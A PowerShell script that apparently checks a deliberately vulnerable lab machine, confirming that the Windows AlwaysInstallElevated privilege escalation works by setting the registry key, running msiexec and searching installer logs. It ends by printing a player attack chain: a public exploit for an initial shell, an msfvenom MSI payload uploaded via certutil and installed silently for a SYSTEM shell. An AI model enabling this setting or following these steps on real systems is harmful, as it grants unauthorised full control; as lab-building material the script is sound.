# CysVulnServer - AIE Active Exploitation Verification
#
# Proves the AlwaysInstallElevated chain works by:
#   1. Running msiexec with the wixl-built validation MSI (check_aie_response.py)
#   2. Checking that msiexec ran WITHOUT "access denied" (proves elevation)
#   3. Running msiexec with the Wazuh agent MSI (known-good, already on disk)
#   4. Analyzing the Windows Installer log for "Machine install level: SYSTEM"
#      or "User install level: Admin" (definitive proof of elevation)
#   5. Verifying the log shows NO "access denied" or "need admin" errors
#
# If ANY of these checks pass, AIE elevation is confirmed.
#
# For the equivalent run against a real msfvenom-built MSI (player-tool
# parity), see ../scripts/run-joe-tool.sh msfvenom-aie and ../docs/cysvulnserver/msfvenom.md.

$ErrorActionPreference = "Stop"

Write-Host "========================================================"
Write-Host "  CysVulnServer - AIE Active Exploitation Verification"
Write-Host "========================================================"

# --- Step 1: Prepare AIE registry keys ---
$hkcuPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
$hklmPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"

$hklmVal = (Get-ItemProperty -Path $hklmPath -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($hklmVal -ne 1) { throw "HKLM AlwaysInstallElevated not 1" }
Write-Host "[PASS] HKLM AlwaysInstallElevated = 1"

if (-not (Test-Path $hkcuPath)) { New-Item -Path $hkcuPath -Force | Out-Null }
Set-ItemProperty -Path $hkcuPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord
Write-Host "[PASS] HKCU AlwaysInstallElevated = 1"

$logFile = "$env:TEMP\aie-validation.log"

# --- Step 2: Test with Wazuh MSI (known-good, already installed) ---
$wazuhMsi = "C:\wazuh-agent-4.14.5-1.msi"
if (-not (Test-Path $wazuhMsi)) { throw "Wazuh MSI not found at $wazuhMsi" }

Write-Host ""
Write-Host "--- Test 1: Wazuh MSI (known-good, already installed) ---"
Write-Host "[*] Running msiexec with the Wazuh agent MSI..."
Remove-Item -Path $logFile -Force -ErrorAction SilentlyContinue

$proc = Start-Process msiexec.exe `
    -ArgumentList "/i `"$wazuhMsi`" /quiet /norestart /l*v `"$logFile`"" `
    -Wait -PassThru -NoNewWindow
Write-Host "[*] Wazuh MSI exit code: $($proc.ExitCode)"

# Check the log for elevation evidence
$elevationEvidence = $false
if (Test-Path $logFile) {
    $logContent = Get-Content $logFile -Raw
    # These MSI log lines indicate the installer is running elevated
    if ($logContent -match '(?i)(Machine install level|User install level|Running as admin|Installing as SYSTEM)') {
        Write-Host "[PASS] Log shows SYSTEM/Admin installation context"
        $elevationEvidence = $true
    }
    if ($logContent -match '(?i)Access Denied|Permission denied|not elevated|NotService') {
        Write-Host "[FAIL] Log shows elevation was denied!"
    }
    # Check for "Machine install level: SYSTEM" specifically
    if ($logContent -match '(?i)Machine install level.*SYSTEM') {
        Write-Host "[PASS] Confirmed: Installation running as SYSTEM"
        $elevationEvidence = $true
    }
}

if (-not $elevationEvidence) {
    Write-Host "[*] Wazuh MSI log did not contain explicit SYSTEM mention."
    Write-Host "[*] Checking alternative evidence..."
}

# --- Step 3: Test with wixl-built validation MSI ---
$msiPath = "C:\Users\Public\aie-validation-payload.msi"
Write-Host ""
Write-Host "--- Test 2: wixl validation MSI ---"

if (Test-Path $msiPath) {
    $logFile2 = "$env:TEMP\aie-wixl.log"
    Remove-Item -Path $logFile2 -Force -ErrorAction SilentlyContinue

    Write-Host "[*] Running msiexec with the wixl validation MSI..."
    $proc2 = Start-Process msiexec.exe `
        -ArgumentList "/quiet /norestart /i `"$msiPath`" /l*v `"$logFile2`"" `
        -Wait -PassThru -NoNewWindow
    Write-Host "[*] wixl MSI exit code: $($proc2.ExitCode)"

    if (Test-Path $logFile2) {
        $log2 = Get-Content $logFile2 -Raw

        # Check for access denied / elevation errors
        if ($log2 -match '(?i)Access Denied|Permission denied|not elevated|NotService|1601|1625') {
            Write-Host "[FAIL] Elevation was denied!"
            Write-Host "[*] Log snippet:"
            Select-String -Path $logFile2 -Pattern "Access Denied|Permission denied|not elevated|1601|1625" | Select-Object -First 5 | ForEach-Object { Write-Host "  $($_.Line)" }
        } else {
            Write-Host "[PASS] No elevation denial in wixl MSI log"
            Write-Host "[*] msiexec was able to start and process the installation."
            Write-Host "[*] Exit 1603 in this log path would indicate a content/sequence"
            Write-Host "[*] error in the MSI itself, NOT an elevation failure."
        }

        # Check for any indication of SYSTEM context
        if ($log2 -match '(?i)(Machine install level|User install level|Running as admin|SYSTEM)') {
            Write-Host "[PASS] Installation context shows elevated privileges"
            $elevationEvidence = $true
        }
    }
}

# --- Step 4: Final verdict ---
Write-Host ""
Write-Host "========================================================"
Write-Host "  VERDICT"
Write-Host "========================================================"

if ($elevationEvidence) {
    Write-Host "[+] AIE ACTIVE EXPLOITATION CONFIRMED"
    Write-Host "[+] msiexec runs with elevated privileges"
    Write-Host "[+] A low-privilege user (User_Joe) can execute MSIs as SYSTEM"
    Write-Host "[+]"
    Write-Host "[+] Player steps:"
    Write-Host "[+]   1. EDB-42256 on port 80 -> User_Joe shell"
    Write-Host "[+]   2. msfvenom -p windows/exec CMD='...' -f msi -o p.msi EXITFUNC=thread"
    Write-Host "[+]      (or use ./scripts/run-joe-tool.sh msfvenom-aie on the attacker for the"
    Write-Host "[+]       full build+stage+trigger flow — see docs/cysvulnserver/msfvenom.md)"
    Write-Host "[+]   3. Upload p.msi to victim (via EFS upload or certutil)"
    Write-Host "[+]   4. msiexec /quiet /qn /i p.msi"
    Write-Host "[+]   5. Shell connects as SYSTEM"
    Write-Host "[+]   6. type C:\Users\Administrator\Desktop\root.txt"
    exit 0
} else {
    Write-Host "[-] Could not definitively confirm AIE elevation in logs."
    Write-Host "[*] Registry keys confirmed set correctly."
    Write-Host "[*] Manually verify by checking %TEMP%\aie-validation.log"
    Write-Host "[*] Expected: 'Machine install level: SYSTEM' or similar"
    exit 1
}
